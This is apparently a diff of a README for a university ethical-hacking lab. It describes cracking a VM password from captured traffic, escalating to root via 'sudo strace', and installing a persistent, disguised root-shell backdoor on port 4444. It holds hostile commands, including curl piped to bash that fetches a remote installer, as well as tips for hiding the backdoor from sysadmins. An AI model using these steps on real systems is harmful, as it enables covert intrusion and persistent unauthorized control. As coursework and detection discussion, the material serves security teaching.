@@ -1,70 +1,91 @@
-# Command and Control
-An ethical hacking lab to enter a linux virtual machine, find a privilege escalation vulnerability, and set up a backdoor as the root user. 
+# Project
 
-## Instructions
-### Logging into the week4 machine:
-ssh into the week4 virtual machine (private VM not publically accessible) using this command:
-`ssh user@10.0.2.5`
+File Overview
+Bash Scripts (Deployed on Target):
 
-The password for the machine is:
-`hill`
- 
- <em>[How the password was discovered](#Password-Crack)</em>
+- backdoor: Deployment script
+
+- sys-upd: Downloads and executes the server
+
+- sys-upd.service: systemd service unit file
+
+Python Scripts:
+
+- sys.py: Backdoor listener (server side)
+
+- access.py: Client interface (run from attacker machine)
+
+A) how to install it in the week4 virtual machine,
+
+Enable the host to communicate with the VM over port 4444, add this rule in VirtualBox:
+
+Go to Settings > Network > Adapter 1 → click Port Forwarding
+
+Add the following rule:
+Name: backdoor-link
+Protocol: TCP
+Host IP: 127.0.0.1
+Host Port: 4444
+Guest IP: (leave blank or default)
+Guest Port: 4444
+
+___________________________________
+
+ssh into the week4 virtual machine
+User: user
+Password: hill
+
+Note: (I analyzed the .pcapng file in Wireshark and identified an HTTP response containing user data. A hashed password for the user user stood out. Using John the Ripper with the rockyou.txt wordlist, I successfully cracked the hash and retrieved the password: hill.)
+
+___________________________________
+
 
 To escalate privileges use this command:
-```bash
-sudo strace -o /dev/null /bin/bash
- ```
-then type `cd` in order to change into the root directory.
 
-<em>[How the privilege escalation was discovered](#Privilege-Escalation)</em>
+Command:sudo strace -o /dev/null /bin/bash
+Command: cd (Change Directory)
+Command: curl -s https://raw.githubusercontent.com/Hussnain-Khan/backdoor/main/Bash/backdoor | bash
 
-### Installing and running the server script on the week4 machine:
-Run the following command which will install the backdoor to the machine. Only 2 files will be installed: the script to run the server from GitHub directly, and the systemd service to ensure persistence (explained further in a later section).
+___________________________________
 
-```bash
-curl -s https://raw.githubusercontent.com/athulnair02/command-and-control/main/install_backdoor | bash
-```
 
-Installing and running the client script on your local machine:
-In any spot on the attacking machine add the file:
+Once this done, Clone the reopsitory in your system and navigate from terminal to Python folder directory and run 
+`python sys.py`
 
-<kbd>[client.py](https://github.com/athulnair02/command-and-control/blob/main/client.py)</kbd>
+B) how your backdoor works internally
 
-Once you’ve done this, you can run the client script at any time using:
-`python client.py` or `python3 client.py`
+Our backdoor operates by deploying a persistent listener on the target machine using a Bash script (sys-upd) managed by a systemd service (sys-upd.service). This script opens TCP port 4444 and runs the Python server (sys.py) which continuously listens for incoming connections. 
 
-## How the backdoor works:
-### How our backdoor addresses the 5 requirements:
-1. **Explanation of how our backdoor provides remote shell access:**
-The backdoor is essentially a shell in which the target machine reveals port `4444/tcp` in the firewall and listens for a connection from the network. The python script on the target side is waiting for a connection, and once accepted and authorized through a password, it receives commands from the attacking machine through TCP and executes them through a subprocess. The output from the command is sent back to the attacking machine through the established connection.
-2. **Persistence:**
-The backdoor maintains persistence using a systemd service that ensures it is always running on the machine. It is the service that initially starts the script to open the backdoor when it is first installed and every time the script ends (either successful, on error, etc.) it will be restarted with a different PID. This way, if there is any unforeseen error in the code, it will not prevent the backdoor from being closed. In addition, if a sysadmin kills the program when finding it suspicious (while looking at top or task manager), it will start again, opening the backdoor once again. Another persistence action taken was having a timeout for the initial backdoor connection. If the backdoor does not have a connection in two minutes, it throws an error and ends the program so that it restarts and ensures the firewall was not closed by the sysadmin. If the firewall is closed, then no connection can be made to the backdoor. This timeout can be changed since the code is directly run off of Github, meaning any push to the main branch will update the backdoor when it is run through the curl command piped into python command.
-3. **Configuration to get commands from:**
-The only configuration needed is to determine the IP address of the target machine (through `nmap` or any other means) and change `REMOTE_HOST` in `client.py` to that address. It is default set to `10.0.2.5`.
-4. **Authentication:**
-We created a password `c0d3m@nk3y` and hashed it using `hash(password)` in python. This hash is then stored on the server/target machine. We then have `client.py` ask the user to input a password as the first message to the target and it is then sent to the server. There, the server hashes it and checks it against the known hash, which once confirmed, allows the user remote root shell access.
-5. **Hiding from detection:**
-There are only 2 files added to the machine: one that is the backdoor, and the other to ensure it keeps running. Both files are using a less suspecting name `auto-update-checker` that creates the illusion of a routine, ordinary task for the sysadmin. The actual script that is run is in the root’s home directory as a hidden file (it can easily be placed elsewhere more secretive). There is no `cronjob` running so a sysadmin cannot find the script running there (where other common repeating programs may be). In addition, the service is buried deep with other services so it will be difficult for a sysadmin to search through all services to determine which one is malicious.
-## How our backdoor can be detected:
-If the sysadmin checks the hidden files in the root home directory, they can find the presence of a file they did not put. If they look past the unsuspecting name and read the script that is running, they will find the backdoor. 
+When a connection is received, it prompts for a password (week4) to authenticate the client. Upon successful login, the server receives and executes shell commands from the client (access.py) and sends back the results. 
 
-If the sysadmin looks at what ports are open on the firewall using `firewall-cmd –list-ports`, they will see that `4444/tcp` is open and will know something odd is in place keeping the port open. If they use further investigation, they may find the program using the port if they install `lsof` and execute `lsof -i:4444`. 
+All communication is socket-based and occurs over the specified port, enabling the attacker to remotely control the host shell in real time while maintaining persistence across reboots.
 
-## Password Crack
-### Discovery and Researching the Vulnerability
-After finding the IP of the target machine as `10.0.2.5`, I looked through the `pcappng` file (saved state file from Wireshark) to see any traffic coming to or from that machine. After following TCP streams here and there, I found a stream with comprehensible data.
-![image](https://github.com/athulnair02/command-and-control/assets/42418601/3da19f36-09eb-44ee-b395-50fc5d5765fe)
-![image](https://github.com/athulnair02/command-and-control/assets/42418601/413c5d59-f7a7-40f2-8a83-01f342470ce2)
-![image](https://github.com/athulnair02/command-and-control/assets/42418601/0547b7f0-8dfe-45d7-9f9d-b263b70399bf)
+___________________________________
 
-I noticed that it looked like an HTTP response with information about users. I saw the user `user` had a password hashed next to it and found it to be intriguing and worth looking into.
+C) how your backdoor works internally
 
-I then used John the Ripper with the wordlist `rockyou.txt` to brute force the password which I found out to be `hill`.
+1. Remote Shell Access
 
-## Privilege Escalation
-I tried to escalate the privilege using linepeas and GTFObins but it was difficult to achieve it at first, but I eventually used the CVE exploit linpeas informed me about and found a GitHub repository with a shell code to run the exploit which escalated me to root.
-![image](https://github.com/athulnair02/command-and-control/assets/42418601/32c2380f-6519-4de2-8973-2cae07d6024a)
+- The sys.py script binds to port 4444 and listens for incoming connections. Once authenticated, it enters a loop waiting for shell commands from the attacker. The command is executed via subprocess.Popen() and results are sent back to the attacker.
 
-The second method I used was through a `sudo` command for `strace`. It allowed to spawn an interactive shell unit as root and maintain root access.
-![image](https://github.com/athulnair02/command-and-control/assets/42418601/d22cdaae-dd2a-478b-93c1-f3ff8b057d1a)
+2. Persistence
+
+Persistence is achieved using a systemd service (sys-upd.service). The backdoor is enabled to auto-start on boot using systemctl enable sys-upd, ensuring the listener runs continuously.
+
+3. Configuration to get commands from:
+
+Commands are received over the network socket (TCP on port 4444). The sys.py server waits for incoming commands from the client and executes them directly.
+
+4. Authentication
+
+The backdoor requires a password (week4) before allowing shell access. If the password is incorrect, the connection is closed and access is denied.
+
+5. Hiding from Detection
+
+The backdoor is disguised as a system update script: sys-upd. It is placed in the /root directory and registered as a systemd service with a generic name.. Minimal console output and error handling are included to avoid raising suspicion.
+
+___________________________________
+
+D) ideas on how yourbackdoor could be detected.
+
+The backdoor can be detected using tools like Wireshark by identifying unusual traffic on port 4444.It may also be exposed through system audits by spotting suspicious services like sys-upd.service or by detecting scripts fetched from GitHub. Security tools or EDRs could flag the listener's behavior of executing remote shell commands.
